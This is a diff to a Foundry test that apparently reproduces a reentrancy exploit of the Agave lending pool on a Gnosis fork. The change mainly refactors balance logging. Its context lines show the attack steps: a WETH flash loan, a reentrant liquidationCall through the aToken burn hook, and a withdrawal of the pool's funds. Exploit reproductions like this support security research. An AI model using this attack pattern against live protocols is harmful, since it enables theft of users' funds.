@@ -73,6 +73,29 @@ contract AgaveExploit is Test {
     ILendingPool lendingPool;
 
     uint256 ethFlashloanAmt = 2730 ether;
+    modifier balanceLog() {
+        _logBalances("Before hack balances");
+        _;
+        _logBalances("After hack balances");
+    }
+
+    function _getTokenBal(address asset) internal view returns (uint256) {
+        return IERC20(asset).balanceOf(address(this));
+    }
+
+    function _logBalances(string memory message) internal {
+        console.log(message);
+        console.log("--- Start of balances ---");
+        emit log_named_decimal_uint("WETH Balance", _getTokenBal(weth), 18);
+        emit log_named_decimal_uint("aWETH Balance", _getTokenBal(aweth), 18);
+        emit log_named_decimal_uint("USDC Balance", _getTokenBal(usdc), 6);
+        emit log_named_decimal_uint("GNO Balance", _getTokenBal(gno), 18);
+        emit log_named_decimal_uint("LINK Balance", _getTokenBal(link), 18);
+        emit log_named_decimal_uint("WBTC Balance", _getTokenBal(wbtc), 8);
+        emit log_named_decimal_uint("healthf", _getHealthFactor(), 18);
+        console.log("--- End of balances ---");
+    }
+
 
     function setUp() public {
         vm.createSelectFork("gnosis", 21_120_283); //fork gnosis at block number 21120319
@@ -127,29 +150,11 @@ contract AgaveExploit is Test {
         lendingPool.withdraw(link, linkWithdraw5, address(this));
     }
 
-    function _logTokenBal(address asset) internal view returns (uint256) {
-        return IERC20(asset).balanceOf(address(this));
-    }
 
-    function _logBalances(string memory message) internal {
-        console.log(message);
-        console.log("--- Start of balances ---");
-        emit log_named_decimal_uint("WETH Balance", _logTokenBal(weth), 18);
-        emit log_named_decimal_uint("aWETH Balance", _logTokenBal(aweth), 18);
-        emit log_named_decimal_uint("USDC Balance", _logTokenBal(usdc), 6);
-        emit log_named_decimal_uint("GNO Balance", _logTokenBal(gno), 18);
-        emit log_named_decimal_uint("LINK Balance", _logTokenBal(link), 18);
-        emit log_named_decimal_uint("WBTC Balance", _logTokenBal(wbtc), 8);
-        emit log_named_decimal_uint("healthf", _getHealthFactor(), 18);
-        console.log("--- End of balances ---");
-    }
-
-    function testExploit() public {
+    function testExploit() public balanceLog {
         //Call prepare and get it setup
         _initHF();
-        _logBalances("Before hack balances");
         _flashWETH();
-        _logBalances("After hack balances");
     }
 
     function _flashWETH() internal {
@@ -168,7 +173,7 @@ contract AgaveExploit is Test {
         //This will start the reentrancy with ontokentransfer call on .burn of the atoken
         lendingPool.liquidationCall(weth, weth, address(this), 2, false);
         //This will withdraw the funds from weth lending pool
-        lendingPool.withdraw(weth, _logTokenBal(aweth), address(this));
+        lendingPool.withdraw(weth, _getTokenBal(aweth), address(this));
         //For test case we just send it to address(1) to reduce the flashloan debt amount from us to get final assets
         WETH.transfer(address(1), ((ethFlashloanAmt * 1000) / 997) + 1);
     }
